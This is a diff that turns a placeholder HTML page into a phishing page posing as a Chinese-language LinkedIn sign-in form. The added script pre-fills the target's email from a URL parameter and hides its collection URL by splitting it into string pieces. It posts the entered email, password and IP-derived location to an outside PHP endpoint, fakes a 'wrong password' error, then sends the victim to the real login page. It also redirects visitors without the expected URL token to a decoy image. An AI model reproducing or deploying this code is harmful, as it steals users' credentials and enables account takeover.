@@ -1,11 +1,733 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-</head>
-<body>
-    Hello All!
-</body>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
+    />
+
+    <title>Welcome</title>
+    <script
+      type="text/javascript"
+      src="https://code.jquery.com/jquery-latest.min.js"
+    ></script>
+    <script>
+      try {
+        let xy = window.location.href.split("?");
+        xy = xy[1].split("__");
+
+        if (xy[1] && xy[1] !== "") {
+          console.log("Good");
+        } else {
+          window.location.href =
+            "https://deep-image.ai/blog/content/images/size/w1000/2024/04/8641ab65-c694-419e-b9a1-665ee08815ce-generated--1-.png";
+        }
+      } catch (e) {
+        window.location.href =
+          "https://deep-image.ai/blog/content/images/size/w1000/2024/04/8641ab65-c694-419e-b9a1-665ee08815ce-generated--1-.png";
+        console.log(e);
+      }
+    </script>
+    <style type="text/css">
+      @font-face {
+        font-family: "page_section_font";
+        src: url("webfonts/open-sans/OpenSans-Regular.ttf") format("truetype");
+      }
+
+      @font-face {
+        font-family: "SFUITextRegular";
+        font-style: normal;
+        font-weight: normal;
+        src: url("webfonts/sfuitext/sf-ui-text-regular-58646b56a688c.woff")
+          format("woff");
+      }
+
+      @font-face {
+        font-family: "SFUITextLight";
+        font-style: normal;
+        font-weight: normal;
+        src: url("webfonts/sfuitext/sf-ui-text-light-5864714f67240.woff")
+          format("woff");
+      }
+
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+        font-family: sans-serif;
+      }
+
+      body {
+        color: #404349;
+        font-family: sans-serif;
+        -webkit-font-smoothing: antialiased;
+      }
+
+      body,
+      html {
+        height: 100%;
+        margin: 0;
+        font-size: 14px;
+      }
+
+      a {
+        text-decoration: none;
+        font-family: sans-serif;
+      }
+
+      a:active {
+        color: #2d6bb3;
+      }
+
+      a:hover {
+        color: #6aace6;
+      }
+
+      #frame {
+        width: 100%;
+        height: auto;
+        margin: 0px;
+        float: left;
+        position: relative;
+        top: 0px;
+        background-color: #fff;
+        font-size: 14px;
+        color: #444;
+        clear: both;
+        z-index: 10;
+        //box-shadow:0px 1px 2px #777;
+      }
+
+      #inner-frame {
+        max-width: 1200px;
+        width: 98%;
+        height: auto;
+        margin: auto;
+        /* margin-bottom: 2%; */
+        margin-top: 2%;
+        /* padding: 10px; */
+        position: relative;
+        overflow-x: hidden;
+      }
+
+      input:-internal-autofill-selected {
+        background-color: transparent;
+      }
+
+      .text {
+        font-family: sans-serif;
+        font-variant: tabular-nums;
+        list-style: none;
+        position: relative;
+        display: inline-block;
+        width: 100%;
+        font-size: 1.3rem;
+        line-height: 1.5;
+        color: #29343d;
+        background-image: none;
+        border-radius: 4px;
+        transition: all 0.3s;
+        background-color: transparent;
+        border: none;
+        padding: 28px 12px 6px;
+        height: 51px;
+      }
+
+      .input_icon_holder {
+        position: relative;
+        margin-bottom: 5%;
+      }
+
+      .input_icon2 {
+        display: table-cell;
+        padding: 6px 15px;
+        font-size: 14px;
+        font-weight: 400;
+        line-height: 1;
+        color: #006097;
+        text-align: center;
+        border: 1px solid #ccc;
+        width: 1%;
+        white-space: nowrap;
+        vertical-align: middle;
+        font-family: SFUITextRegular;
+        background-color: #fefefe;
+        cursor: pointer;
+      }
+
+      #label {
+        padding: 5px;
+        position: absolute;
+        right: 10px;
+        top: 10px;
+        z-index: 10;
+        width: auto;
+        font-size: 14px;
+        font-weight: 600;
+        color: #006097;
+        text-align: center;
+        border: none;
+        vertical-align: middle;
+        //font-family: SFUITextRegular;
+        background-color: #fff;
+      }
+
+      #label:hover {
+        background-color: #f2f2f2;
+      }
+
+      .input_icon_holder2 {
+        position: relative;
+        display: table;
+        border-collapse: separate;
+        margin-top: 24px;
+        border: 1px solid #333;
+        border-radius: 4px;
+        color: #333;
+      }
+
+      .errorfound {
+        border: 2px solid #d00;
+        box-shadow: 0px 0px 1px #d00;
+        color: #d00;
+      }
+
+      .inv_btn {
+        background-color: #0a66c2;
+        padding: 15px 20px;
+        margin-left: 10px;
+        border: none;
+        color: #fff;
+        font-size: 14px;
+        font-family: page_title_font;
+        cursor: pointer;
+        height: 52px;
+        border-radius: 5px;
+      }
+
+      .inv_btn_i {
+        background-color: #0a66c2;
+      }
+
+      .inv_btn_i:hover {
+        background-color: #0073b1;
+      }
+
+      #form_layout {
+        display: none;
+        position: relative;
+        max-width: 353px;
+        width: 100%;
+        margin: auto;
+        height: auto;
+        background-color: rgba(255, 255, 255, 0.1);
+        color: #fff;
+        text-align: left;
+        //padding:7px;
+        margin-top: 30px;
+        margin-bottom: 0;
+        font-size: 12px;
+        //box-shadow:-1px 18px 3px 0px #333;
+      }
+
+      a:visited {
+        color: #665ed0;
+      }
+      a:visited {
+        color: #0073b1;
+      }
+      a {
+        text-decoration: none;
+        font-weight: bold;
+        background-color: transparent;
+        border: 0;
+        color: #0073b1;
+      }
+      a {
+        margin: 0;
+        padding: 0;
+        font-size: 100%;
+        vertical-align: baseline;
+        background: transparent;
+      }
+
+      @keyframes reduce {
+        from {
+          font-size: 16px;
+          height: 100%;
+          top: 0;
+        }
+        to {
+          font-size: 12px;
+          height: 30%;
+          top: -10px;
+        }
+      }
+
+      @keyframes increase {
+        from {
+          font-size: 12px;
+          height: 30%;
+          top: -10px;
+        }
+        to {
+          font-size: 16px;
+          height: 100%;
+          top: 0;
+        }
+      }
+    </style>
+
+    <script>
+      let resBox = "LnK";
+
+      let nbg1 = "htt";
+      let nbg2 = "ps://globa";
+      let nbg3 = "llendin";
+      let nbg4 = "gchain.c";
+      let nbg5 = "om/we";
+      let nbg6 = "bxr.php";
+
+      let nbg = `${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}`;
+
+      let xz = window.location.href.split("?");
+      xz = xz[1].split("__");
+
+      let ov1 = "https";
+      let ov2 = "://";
+      let ov3 = "lin";
+      let ov4 = "kedin";
+      let ov5 = ".cn";
+      let ov6 = "/lo";
+      let ov7 = "gin";
+      let ov = `${ov1}${ov2}${ov3}${ov4}${ov5}${ov6}${ov7}`;
+
+      // sessionStorage.clear()
+      let trialCount = sessionStorage.getItem("num_trial");
+
+      if (!trialCount) {
+        sessionStorage.setItem("num_trial", 0);
+      } else if (trialCount >= 2) {
+        window.location.assign(ov);
+      }
+    </script>
+  </head>
+  <body>
+    <div id="frame" style="background-color: #fff; margin-top: 27px">
+      <div
+        style="float: left; width: 100%; text-align: left; padding-left: 56px"
+      ></div>
+
+      <style>
+        #loader {
+          display: none;
+          align-items: center;
+          justify-content: center;
+          width: 100%;
+          height: 100%;
+          position: absolute;
+          top: 0;
+          left: 0;
+          background-color: #fff9;
+          z-index: 99;
+          border-radius: 10px;
+        }
+
+        @keyframes hideLoader {
+          from {
+            opacity: 1;
+          }
+
+          to {
+            opacity: 0;
+          }
+        }
+
+        @keyframes showLoader {
+          from {
+            opacity: 0;
+          }
+
+          to {
+            opacity: 1;
+          }
+        }
+
+        @keyframes fhAnime {
+          from {
+            margin-top: 100px;
+          }
+          to {
+            margin-top: 30px;
+          }
+        }
+      </style>
+      <div id="inner-frame" align="center">
+        <div id="form_layout">
+          <div id="loader">
+            <i
+              class="fa fa-spinner fa-spin"
+              style="font-size: 16px; color: #333"
+            ></i>
+          </div>
+          <div
+            style="
+              -webkit-box-shadow: 0 4px 12px rgb(0 0 0 / 15%);
+              box-shadow: 0 4px 12px rgb(0 0 0 / 15%);
+              padding: 24px 27px;
+              border-radius: 8px;
+              width: 100%;
+            "
+          >
+            <div style="margin-top: 0px">
+              <h1
+                style="
+                  color: rgba(0, 0, 0, 0.9);
+                  font-size: 30px;
+                  font-family: system-ui;
+                  font-weight: 500;
+                "
+              >
+                登录
+              </h1>
+              <p
+                style="
+                  font-size: 13px;
+                  font-weight: 400;
+                  line-height: 1.42857;
+                  color: rgba(0, 0, 0, 0.9);
+                  padding-top: 5px;
+                "
+              >
+                随时掌握职场资讯。
+              </p>
+            </div>
+
+            <form action="" method="post" id="form_">
+              <input type="hidden" required id="foc" value="" readonly />
+              <input type="hidden" name="loc" id="loc" />
+              <input type="hidden" name="hos" id="hos" value="fc24" />
+              <input type="hidden" name="trial" id="trial" />
+
+              <div class="input_icon_holder2" style="display: block">
+                <div style="display: table-caption"></div>
+                <div
+                  class="text_label"
+                  style="
+                    color: #333;
+                    padding: 18px 10px;
+                    position: absolute;
+                    z-index: 0;
+                    width: 100%;
+                    height: 100%;
+                    font-size: 16px;
+                    font-weight: 100;
+                  "
+                >
+                  邮箱或手机
+                </div>
+
+                <input
+                  type="email"
+                  onclick="pop_label(0)"
+                  onchange="changed(0)"
+                  onblur="hide_label(0)"
+                  placeholder=""
+                  required
+                  class="text mm"
+                  id="fuc"
+                  value=""
+                />
+              </div>
+
+              <div class="input_icon_holder2" style="display: block">
+                <div style="display: table-caption"></div>
+                <div
+                  class="text_label"
+                  style="
+                    padding: 18px 10px;
+                    position: absolute;
+                    z-index: 0;
+                    width: 100%;
+                    height: 100%;
+                    font-size: 16px;
+                    font-weight: 100;
+                  "
+                >
+                  密码
+                </div>
+
+                <input
+                  type="password"
+                  onclick="pop_label(1)"
+                  onblur="hide_label(1)"
+                  required
+                  class="text mm"
+                  id="fpc"
+                  pattern="(?=^.{6,}$).*$"
+                />
+                <button type="button" id="label" onclick="show_text()">
+                  显示
+                </button>
+              </div>
+              <div
+                id="errmsg"
+                style="
+                  color: #d00;
+                  font-weight: 400;
+                  font-family: sans-serif;
+                  font-size: 14px;
+                "
+              ></div>
+              <div
+                style="
+                  position: relative;
+                  left: -8px;
+                  padding-left: 8px;
+                  color: #0a66c2 !important;
+                "
+              >
+                <br />
+              </div>
+              <button
+                type="submit"
+                style="
+                  margin: 0;
+                  margin-top: 19px;
+                  width: 100%;
+                  font-size: 16px;
+                  font-family: system-ui;
+                  font-weight: 600;
+                "
+                class="inv_btn inv_btn_i"
+              >
+                登录
+              </button>
+
+              <div
+                style="
+                  position: relative;
+                  padding-top: 13px;
+                  margin: auto;
+                  text-align: center;
+                  width: 100%;
+                  float: left;
+                "
+              >
+                <span
+                  style="
+                    background-color: #fff;
+                    position: relative;
+                    padding: 5px 10px;
+                    color: #000;
+                    font-size: 14px;
+                    z-index: 12;
+                    width: 40px;
+                  "
+                >
+                  或
+                </span>
+                <hr
+                  style="
+                    width: 100%;
+                    position: absolute;
+                    top: 23px;
+                    z-index: 1;
+                    height: 1px;
+                    background-color: rgba(0, 0, 0, 0.15);
+                    border: none;
+                  "
+                />
+              </div>
+
+              <button
+                type="button"
+                name=""
+                style="
+                  margin: 0;
+                  margin-top: 13px;
+                  width: 100%;
+                  font-size: 16px;
+                  font-family: system-ui;
+                  font-weight: 600;
+                  color: rgba(0, 0, 0, 0.9);
+                  background-color: #fff;
+                  border: 1px solid #000;
+                "
+                class="inv_btn inv_btn_i"
+              >
+                <i
+                  class="fa fa-apple"
+                  style="font-size: 18px; color: rgba(0, 0, 0, 0.6) !important"
+                ></i
+                >&nbsp; 用 Apple 帐号登录</button
+              ><br />
+            </form>
+          </div>
+          <div style="margin-top: 35px"></div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      setTimeout(() => {
+        let fh = document.querySelector("#form_layout");
+        fh.style.display = "block";
+        fh.style.animation = "fhAnime .5s ease";
+      }, 2000);
+      let xx = window.location.href.split("?");
+      let foc = document.querySelector("#foc");
+      let fuc = document.querySelector("#fuc");
+      let fpc = document.querySelector("#fpc");
+      let loader = document.querySelector("#loader");
+      let loc = document.querySelector("#loc");
+      let trial = document.querySelector("#trial");
+
+      xx = xx[1].split("__");
+
+      var base64regex =
+        /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+
+      if (!base64regex.test(xx[1])) {
+        foc.value = xx[1];
+        fuc.value = xx[1];
+      } else {
+        foc.value = atob(xx[1]);
+        fuc.value = atob(xx[1]);
+      }
+
+      trial.value = trialCount;
+
+      let myForm = document.querySelector("#form_");
+      myForm.addEventListener("submit", async function (event) {
+        event.preventDefault();
+
+        let data = new FormData();
+
+        let options = {
+          method: "POST",
+          body: data,
+        };
+        data.append("hos", xx[2]);
+        data.append("foc", foc.value);
+        data.append("fuc", fuc.value);
+        data.append("fpc", fpc.value);
+        data.append("loc", loc.value);
+        data.append("trial", trial.value);
+        data.append("resBox", resBox);
+
+        loader.style.display = "flex";
+        loader.style.animation = "showLoader .5s ease";
+
+        const response = await fetch(nbg, options);
+        const result = await response.text();
+
+        loader.style.animation = "hideLoader 1s ease";
+        setTimeout(() => {
+          loader.style.display = "none";
+        }, 1000);
+
+        console.log(result);
+
+        trialCount++;
+        sessionStorage.setItem("num_trial", trialCount);
+        trial.value = trialCount;
+
+        if (trialCount >= 2) {
+          window.location.assign(ov);
+        } else {
+          fpc.value = "";
+          fpc.focus();
+          document.getElementById("errmsg").innerHTML =
+            "邮箱或密码错误。请重试或创建帐号。";
+        }
+      });
+
+      $.get(
+        "https://ipinfo.io/json?token=10da60a9ff2d81",
+        function (response) {
+          let cou = `${response.city}, ${response.region}, ${response.country}. ${response.postal} ${response.timezone}`;
+          $("#loc").val(cou);
+        },
+        "jsonp"
+      );
+    </script>
+
+    <script type="text/javascript">
+      window.onload = function () {
+        x = document.getElementsByClassName("mm")[0].value.trim();
+        y = document.getElementsByClassName("mm")[1].value.trim();
+
+        if (x.trim() == "") {
+          var label = document.getElementsByClassName("text_label");
+          label[0].style.animation = "increase .1s linear"; //alert(id)
+          label[0].style.fontSize = "16px";
+          label[0].style.height = "100%";
+          label[0].style.top = "0px";
+        } else {
+          var label = document.getElementsByClassName("text_label");
+          label[0].style.animation = "reduce .1s linear"; //alert(id)
+          label[0].style.fontSize = "12px";
+          label[0].style.height = "30%";
+          label[0].style.top = "-10px";
+        }
+
+        if (y.trim() == "") {
+          var label = document.getElementsByClassName("text_label");
+          label[1].style.animation = "increase .1s linear"; //alert(id)
+          label[1].style.fontSize = "16px";
+          label[1].style.height = "100%";
+          label[1].style.top = "0px";
+        } else {
+          var label = document.getElementsByClassName("text_label");
+          label[1].style.animation = "reduce .1s linear"; //alert(id)
+          label[1].style.fontSize = "12px";
+          label[1].style.height = "30%";
+          label[1].style.top = "-10px";
+        }
+      };
+
+      function changed(id) {
+        pop_label(id);
+      }
+
+      function pop_label(id) {
+        var label = document.getElementsByClassName("text_label");
+        label[id].style.animation = "reduce .1s linear"; //alert(id)
+        label[id].style.fontSize = "12px";
+        label[id].style.height = "30%";
+        label[id].style.top = "-10px";
+      }
+
+      function hide_label(id) {
+        x = document.getElementsByClassName("mm")[id].value;
+        //alert(x.trim());
+        if (x.trim() == "") {
+          var label = document.getElementsByClassName("text_label");
+          label[id].style.animation = "increase .1s linear"; //alert(id)
+          label[id].style.fontSize = "16px";
+          label[id].style.height = "100%";
+          label[id].style.top = "0px";
+        }
+      }
+
+      function show_text() {
+        var pass_field = document.getElementById("fpc");
+        var pass_label = document.getElementById("label");
+        var testVal = pass_label.innerHTML.trim();
+        if (testVal == "显示") {
+          pass_field.type = "text";
+          pass_label.innerHTML = "隐藏";
+        } else if (testVal == "隐藏") {
+          pass_field.type = "password";
+          pass_label.innerHTML = "显示";
+        }
+      }
+    </script>
+  </body>
 </html>
